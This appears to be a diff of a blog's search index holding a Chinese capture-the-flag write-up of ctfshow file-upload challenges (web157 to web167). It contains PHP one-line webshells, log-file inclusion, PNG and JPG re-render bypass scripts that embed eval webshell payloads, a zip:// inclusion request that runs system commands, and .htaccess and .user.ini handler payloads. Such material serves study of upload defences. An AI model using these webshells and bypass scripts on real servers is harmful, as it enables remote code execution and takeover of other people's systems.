+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>增加过滤了分号和<code>&#123;&#125;</code></p>
+<p>直接一句话读吧，ctfshow经典绕过各种过滤，有点小难受。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;tac ../f*&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>同web157，一把过。</p>
+<h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>同web157</p>
+<h3 id="web160（日志包含逃逸）"><a href="#web160（日志包含逃逸）" class="headerlink" title="web160（日志包含逃逸）"></a>web160（日志包含逃逸）</h3><p>这道题还是基于上面<code>.user.ini</code>的攻击思路，但是也需要类似逃逸的思路。</p>
+<p>首先描述一下攻击思路：</p>
+<p><strong>.user.ini（文件包含）—&gt; 上传1.png（rce，可控）—&gt; /upload/index.php 攻击</strong></p>
+<p>但是当我们对文件内容进行较为严格的过滤时，我们可以考虑在<code>1.png</code>时继续文件包含，将<code>rce</code>的内容转移到新的文件中，于是我们重写<code>1.png</code>文件上传的内容。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/n&#x27;</span>.<span class="string">&#x27;ginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在日志中写入我们的一句话木马，成功实现<code>rce</code>。</p>
+<h3 id="web161（文件头检查绕过）"><a href="#web161（文件头检查绕过）" class="headerlink" title="web161（文件头检查绕过）"></a>web161（文件头检查绕过）</h3><p>这道题我们基本套路的和payload都和web160一致，但是需要在上传文件时，将文件头改为<code>GIF89a</code>，这是GIF文件头。</p>
+<h3 id="web164（PNG文件渲染）"><a href="#web164（PNG文件渲染）" class="headerlink" title="web164（PNG文件渲染）"></a>web164（PNG文件渲染）</h3><p>这道题我们首先上传一个普通的文件，发现能够查看，观察到<code>url</code>后有文件名，暗示有文件包含的漏洞。</p>
+<p>尝试了<code>GIF89a</code>文件头，返回报错说只支持<code>PNG</code>，但是直接<code>PNG</code>打进去，看起来没什么可以过滤的点（这里附上后来打出来的源代码）。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件大小不超1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查content-type头</span></span><br><span class="line">    	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = pathinfo(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$ext_suffix</span>, <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>)))&#123;</span><br><span class="line">                <span class="comment">//二次渲染png图片，随意的图片马会被清洗</span></span><br><span class="line">                <span class="variable">$png</span> = imagecreatefrompng(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$png</span>==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$dst</span> = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                    imagepng(<span class="variable">$png</span>,<span class="variable">$dst</span>);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;只支持PNG&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    		<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="variable">$ret</span>);<span class="keyword">echo</span> json_encode(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure>
+<p>逃避<code>PNG</code>二次渲染的手段有两种，一个是修改<code>CRC</code>值，另一个是修改数据段，这里附上国外大佬给的脚本：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./insert_data.png&#x27;</span>);</span><br><span class="line"><span class="comment">//payload = <span class="meta">&lt;?=</span>$_GET[0]($_POST[1]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>图片传上去后，利用抓包重放这样就可以拿到想要的数据了。</p>
+<h3 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h3><p>jpg图片二次渲染</p>
+<p>附上脚本和用法，基本上都看得懂了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php ./exp.php a.jpg</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h3><p>前端打开，只要<code>zip</code>，考虑使用<code>zip</code>或者<code>phar</code>伪协议</p>
+<p>直接把包上传，在<code>download.php</code>那里完成文件包含</p>
+<p>需要注意的是，文件上传的时候，要修改一下文件类型</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-zip-compressed</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload/download.php?file=zip://59efade1276a2f4b6629781e65a2d409.zip%231.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>193087d3-0d5f-4ade-bc63-8959ef28b865.challenge.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://193087d3-0d5f-4ade-bc63-8959ef28b865.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"></span><br><span class="line"><span class="ini"><span class="attr">1</span>=system(<span class="string">&#x27;ls ../&#x27;</span>)<span class="comment">;</span></span></span><br></pre></td></tr></table></figure>
+<p>这样就成功打进去了。</p>
+<h3 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h3><p>一直打，有点累了。主要讲讲思路吧。</p>
+<ol>
+<li>打开前端，看看要传什么文件</li>
+<li>传个普通jpg，返回来可以直接读取，不是文件包含</li>
+<li>传个普通jpg图片马，竟然直接过了，说明不检查文件头和文件内容</li>
+<li>改个PHP，phtml看看，PHP被ban了，phtml无法解析</li>
+<li>看看.user.ini有没办法来搞一哈，发现还是不行，对应目录下没有php文件</li>
+<li>这些都寄了，这些考虑一下解析漏洞了，打一个<code>.htaccess</code>进去，这下过了</li>
+</ol>
+<p>附上<code>.htaccess</code>的payload吧</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>当<code>flag</code>存在的文件不是<code>PHP</code>文件，我们也可以直接利用类似<code>.user.ini</code>的方法来做</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file &#x27;flag&#x27;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>upload</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>ctfshow</tag>
+        <tag>upload</tag>
       </tags>
   </entry>
 </search>
